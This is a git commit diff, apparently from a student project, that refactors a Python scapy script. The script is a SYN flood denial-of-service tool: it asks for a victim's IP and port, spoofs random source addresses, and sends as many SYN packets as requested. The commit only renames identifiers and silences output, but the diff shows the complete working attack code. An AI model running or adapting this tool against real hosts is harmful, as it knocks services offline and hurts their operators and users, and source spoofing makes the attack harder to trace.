92cc4f1f8bc3bc879a756413c02262e3925d9dd5
emdantasc <emdantasc@ufrn.edu.br>
2018-10-10 03:25:19 -0300

    update

--- hping3.py
+++ hping3.py
@@ -2,23 +2,23 @@ import sys
 import random
 from scapy.all import *
 
-def SYN_Flood(dstIP,dstPort,limit):
+def syn_flood(ip_destination,port_destination,limit):
 	total = 0
 	print "Enviando Pacotes"
 	for x in range (0,limit):
-		IP_Packet = IP()
-		IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
-		IP_Packet.dst = dstIP
+		ip_packet = IP()
+		ip_packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
+		ip_packet.dst = ip_destination
 
-		TCP_Packet = TCP ()	
-		TCP_Packet.sport = random.randint(1000,9000)
-		TCP_Packet.dport = dstPort
-		TCP_Packet.flags = "S"
-		TCP_Packet.seq = random.randint(1000,9000)
-		TCP_Packet.window =random.randint(1000,9000)
+		tcp_packet = TCP ()	
+		tcp_packet.sport = random.randint(1000,9000)
+		tcp_packet.dport = port_destination
+		tcp_packet.flags = "S"
+		tcp_packet.seq = random.randint(1000,9000)
+		tcp_packet.window =random.randint(1000,9000)
 
-		print("Source: "+IP_Packet.src+":"+str(TCP_Packet.sport))
-		send(IP_Packet/TCP_Packet)
+		print("Source: "+ip_packet.src+":"+str(tcp_packet.sport))
+		send(ip_packet/tcp_packet,verbose=0)
 		total+=1
 	
 
@@ -27,6 +27,6 @@ def main():
 	victim_IP = raw_input ("\n"+"Insira o IP da vitima:")
 	victim_port = input ("Insira a porta para ataque: ")
 	limit = input ("Quantidade de pacotes a enviar:")
-	SYN_Flood(victim_IP,victim_port,int(limit))
+	syn_flood(victim_IP,victim_port,int(limit))
 
 main()
